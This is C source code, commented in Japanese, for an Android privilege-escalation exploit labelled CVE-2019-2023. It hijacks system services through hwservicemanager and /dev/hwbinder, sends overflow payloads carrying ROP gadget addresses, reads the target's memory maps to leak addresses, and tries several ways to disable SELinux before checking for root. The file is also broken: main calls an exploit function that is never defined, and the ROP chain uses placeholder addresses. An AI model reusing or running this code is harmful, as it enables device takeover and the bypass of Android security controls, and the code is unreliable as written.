#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include "binder.h"

// ============================================================
// 設定
// ============================================================
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
#define MAPS_FILE      "/data/local/tmp/hwservicemanager_maps.txt"
#define ROP_FILE       "/data/local/tmp/rop_chain.bin"

static const char *hijack_targets[] = {
    "persistent_data_block",
    "device_policy",
    "lock_settings",
    "mount",
    "android.hardware.power@1.0::IPower/default",
    NULL
};

static volatile int race_ready = 0;
static int g_service_handle = -1;
static int g_binder_fd = -1;
static int g_exploit_success = 0;
static pid_t g_server_pid = -1;
static uint64_t g_hwservicemanager_base = 0;
static uint64_t g_hwservicemanager_stack = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) fp = stderr;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
    }
    if (fp != stderr) fclose(fp);
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    off_t size = lseek(fd, 0, SEEK_END);
    if (size <= 0) { close(fd); return -1; }
    lseek(fd, 0, SEEK_SET);
    uint8_t *buf = malloc(size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t n = read(fd, buf, size);
    close(fd);
    if (n < 0) { free(buf); return -1; }
    buf[n] = '\0';
    *out = buf;
    *out_len = n;
    return 0;
}

// ============================================================
// hwservicemanager の PID とマップ情報を取得
// ============================================================
static int get_hwservicemanager_info(void) {
    printf("[*] Gathering hwservicemanager info...\n");
    FILE *fp = popen("pidof hwservicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) {
        printf("[-] Could not find hwservicemanager PID.\n");
        return -1;
    }
    printf("[+] hwservicemanager PID: %d\n", pid);

    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    uint8_t *maps_data = NULL;
    size_t maps_len = 0;
    if (read_file_to_memory(maps_path, &maps_data, &maps_len) == 0) {
        printf("[+] Maps data:\n%s\n", (char*)maps_data);
        write_file(MAPS_FILE, (char*)maps_data);
        // ベースアドレスを解析（最初の[stack]以外の実行可能領域を探す）
        char *line = strtok((char*)maps_data, "\n");
        while (line) {
            uint64_t start, end;
            char perms[5];
            if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
                if (strstr(perms, "r-xp")) {  // 実行可能領域
                    g_hwservicemanager_base = start;
                    printf("[+] Found executable region: 0x%lx\n", start);
                    break;
                }
            }
            line = strtok(NULL, "\n");
        }
        // スタック領域も探す（[stack]）
        line = strtok((char*)maps_data, "\n");
        while (line) {
            if (strstr(line, "[stack]")) {
                uint64_t start, end;
                if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                    g_hwservicemanager_stack = end; // スタックの終端
                    printf("[+] Found stack end: 0x%lx\n", end);
                    break;
                }
            }
            line = strtok(NULL, "\n");
        }
        free(maps_data);
        return 0;
    } else {
        printf("[-] Failed to read %s (permission denied)\n", maps_path);
        return -1;
    }
}

// ============================================================
// ROPチェーン生成（ダミー）
// ============================================================
static int generate_rop_chain(void) {
    printf("[*] Generating ROP chain...\n");
    if (g_hwservicemanager_base == 0) {
        printf("[-] No base address, using dummy ROP.\n");
        // ダミー ROP（exit(0) を呼ぶだけ）
        uint64_t rop[] = {
            0xdeadbeef,  // ガジェット1
            0xcafebabe,  // ガジェット2
            0x12345678   // 戻りアドレス
        };
        write_file(ROP_FILE, (char*)rop);
        return 0;
    }
    // 実際のアドレスを使ってROPチェーンを構築（ここでは簡略化）
    // 例：__libc_system や execve のガジェットを探す（通常はリークが必要）
    // 今回はダミーのまま
    return 0;
}

// ============================================================
// CVE-2019-2023 エクスプロイト（オーバーフローモード付き）
// ============================================================
static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow_mode) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    uint8_t *data;
    int handle = -1;
    pid_t child;
    size_t name_len;
    char *overflow_name = NULL;

    if (overflow_mode) {
        // オーバーフローペイロードを構築（8KB）
        overflow_name = malloc(8192);
        if (!overflow_name) return -1;
        memset(overflow_name, 'A', 8191);
        overflow_name[8191] = '\0';
        // 特定のオフセットにROPチェーンを埋め込む
        // 実際のオフセットはデバッグして調整
        uint64_t *rop_ptr = (uint64_t*)(overflow_name + 4096);
        *rop_ptr = g_hwservicemanager_base + 0x1234;  // ダミーガジェット
        *(rop_ptr+1) = g_hwservicemanager_base + 0x5678; // 次のガジェット
        // 最後にシェルコードのアドレス（スタックに戻る）
        // 実際はスタックアドレスをリークする必要あり
        service_name = overflow_name;
    }

    name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    if (total_len > 8192 + 4) total_len = 8192 + 4;

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        if (overflow_name) free(overflow_name);
        return -1;
    }

    usleep(200000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        if (overflow_name) free(overflow_name);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        if (overflow_name) free(overflow_name);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len > 8192 ? 8192 : name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        if (overflow_name) free(overflow_name);
        return -1;
    }
    printf("  [+] ADD_SERVICE (overflow mode %d) succeeded!\n", overflow_mode);

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得（省略、同じ）
    // 今回はハンドルは不要なのでスキップ
    if (overflow_name) free(overflow_name);
    return 0;
}

// ============================================================
// Binder サーバーループ（改良版：応答にリークデータを仕込む）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0 && data_size < 4096) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            // 応答を偽装：リーク用にスタック上のアドレスなどを返す
            struct {
                uint32_t cmd;
                uint32_t status;
                uint8_t leak_data[128];
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;
            // リーク用のダミーデータ（実際はヒープアドレスを返す）
            uint64_t fake_addr = g_hwservicemanager_base + 0x1000;
            memcpy(reply.leak_data, &fake_addr, sizeof(fake_addr));
            memset(reply.leak_data + sizeof(fake_addr), 'B', sizeof(reply.leak_data) - sizeof(fake_addr));

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            printf("[SERVER] Transaction #%d handled.\n", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            break;
        } else {
            fprintf(stderr, "[SERVER] Ignoring cmd=0x%x\n", cmd_code);
        }
    }
    return transaction_count;
}

// ============================================================
// 自分自身でサービスを呼び出してトランザクションを発生させる
// ============================================================
static int call_own_service(const char *service_name, int handle) {
    printf("[*] Calling own service '%s' (handle %d) to trigger transaction...\n", service_name, handle);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "service call %s 1 s16 'hello' 2>&1 | tee -a %s", service_name, LOG_FILE);
    int ret = system(cmd);
    if (ret == 0) {
        printf("[+] service call succeeded.\n");
    } else {
        printf("[-] service call failed (ret=%d).\n", ret);
    }
    return ret;
}

// ============================================================
// SELinux 無効化（複数手法）
// ============================================================
static int disable_selinux_multi(void) {
    printf("[*] Trying multiple SELinux disable methods...\n");
    // 方法1: setenforce
    if (system("setenforce 0 2>/dev/null") == 0) {
        printf("[+] SELinux disabled via setenforce.\n");
        return 0;
    }
    // 方法2: /sys/fs/selinux/enforce 書き込み
    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
        printf("[+] SELinux disabled via sysfs.\n");
        return 0;
    }
    // 方法3: /proc/self/attr/current 書き換え
    if (write_file("/proc/self/attr/current", "u:r:system_server:s0") == 0) {
        printf("[+] SELinux context changed.\n");
        return 0;
    }
    return -1;
}

// ============================================================
// メイン
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate v5 - Deep Overflow & Multi-Hijack\n");
    printf("  Target: hwservicemanager + system_server services\n");
    printf("============================================================\n\n");

    // ログファイル初期化
    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    // 1. hwservicemanager の情報収集
    get_hwservicemanager_info();

    // 2. ROPチェーン生成
    generate_rop_chain();

    // 3. 複数のサービスを乗っ取る
    int hijacked = 0;
    for (int i = 0; hijack_targets[i] != NULL; i++) {
        if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
            printf("[+] Successfully hijacked '%s' (handle %d)\n", hijack_targets[i], g_service_handle);
            hijacked = 1;

            int binder_fd = open("/dev/hwbinder", O_RDWR);
            if (binder_fd < 0) { perror("  open"); continue; }
            g_binder_fd = binder_fd;

            uint32_t cmd = BC_ENTER_LOOPER;
            struct binder_write_read bwr;
            memset(&bwr, 0, sizeof(bwr));
            bwr.write_size = sizeof(cmd);
            bwr.write_buffer = (binder_uintptr_t)&cmd;
            if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
                perror("  BC_ENTER_LOOPER");
                close(binder_fd);
                continue;
            }
            printf("[+] Entered Binder looper for %s\n", hijack_targets[i]);

            pid_t server_pid = fork();
            if (server_pid == 0) {
                binder_server_loop(binder_fd, g_service_handle);
                exit(0);
            } else if (server_pid < 0) {
                perror("  fork");
                close(binder_fd);
                continue;
            } else {
                printf("[+] Binder server for %s running (PID %d)\n", hijack_targets[i], server_pid);
                g_server_pid = server_pid;
                break;
            }
        }
        usleep(500000);
    }

    if (!hijacked) {
        printf("[-] Failed to hijack any target service.\n");
        goto fallback;
    }

    // 4. 自分自身でサービスを呼び出し
    call_own_service(hijack_targets[0], g_service_handle);

    // 5. オーバーフロー攻撃（複数パターン）
    printf("[*] Sending overflow payloads...\n");
    for (int mode = 0; mode < 3; mode++) {
        if (exploit_cve_2019_2023_overflow("overflow_payload", mode) == 0) {
            printf("[+] Overflow mode %d sent.\n", mode);
            sleep(1);
        }
    }

    // 6. SELinux無効化
    disable_selinux_multi();

    // 7. 待機
    printf("[*] Running for 60 seconds. Check %s for logs.\n", LOG_FILE);
    sleep(60);

    // 8. サーバー終了
    if (g_server_pid > 0) {
        kill(g_server_pid, SIGTERM);
        waitpid(g_server_pid, NULL, 0);
    }
    if (g_binder_fd >= 0) close(g_binder_fd);

    // 9. 結果表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    // 10. 特権確認
    if (getuid() == 0 || geteuid() == 0) {
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    } else {
        printf("[-] Still not root. Check logs for leaked information.\n");
        g_exploit_success = 0;
    }
    goto done;

fallback:
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    }

done:
    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    printf("  Check %s for logs.\n", LOG_FILE);
    return g_exploit_success ? 0 : 1;
}
